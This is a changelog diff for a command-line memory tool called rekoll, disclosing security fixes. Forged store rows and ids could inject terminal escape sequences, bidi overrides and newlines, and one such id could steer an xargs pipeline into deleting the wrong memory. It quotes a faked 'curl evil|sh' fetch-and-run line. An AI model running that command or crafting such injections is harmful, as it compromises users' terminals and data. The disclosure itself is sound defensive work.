@@ -49,6 +49,37 @@ A dedicated **Security** heading is kept per the governance commitment in
   default for a project virtualenv, because the `rekoll-mcp` console-script
   shim embeds an absolute path and breaks on rename.
 
+### Security
+
+- **Stored content can no longer drive your terminal (#98, ADR-0044).** A store
+  is a file a repo can ship, and rows forged directly into one never passed the
+  ingest firewall — content-hash verification doesn't help, because whoever
+  forges the row computes the hash. `rekoll recall`'s human list rendered such
+  content verbatim, so a crafted memory could emit escape sequences that clear
+  the screen and paint an authoritative-looking instruction. The human render
+  path now drops characters that *drive* a terminal (control codes, `\r`, and
+  bidi overrides — the "Trojan Source" class) while keeping every character
+  that merely *appears* in one: CJK, accents, real right-to-left text, and
+  emoji with their ZWJ joiners are byte-for-byte untouched, and a test pins
+  that half too. Nothing is hidden — the words still print, declawed.
+  The same treatment covers every other stored string on a human line — the
+  record id, the source-file pointer, and the board's id and timestamp — which
+  an adversarial review proved were the *real* hole: a forged id carried
+  escapes one line below the fix, and a **newline** in an id fabricated an
+  entire extra numbered "hit" using no control characters at all.
+- **`rekoll recall --ids` can no longer be steered into deleting the wrong
+  memory (#98).** Ids are stored data, so a newline inside one split the output
+  into two tokens — the second being *another record's real id*. The documented
+  `recall --ids | xargs rekoll forget` pipeline then deleted a memory the query
+  never matched. Ids now render one per line, and a mangled id is **reported**
+  on stderr as possible direct-DB tampering rather than silently passed along.
+  `--json`, `--context` and every MCP payload were verified already safe and
+  are unchanged.
+- `rekoll doctor` no longer lets a **committed `.mcp.json`** forge its output:
+  a crafted `command` could clear the terminal and paint a fake
+  `SECURITY ALERT: run curl evil|sh` line that looked like rekoll's own. Every
+  config- and store-derived string in the new checks is now display-sanitized.
+
 ## [0.1.3] - 2026-07-25
 
 ### Added
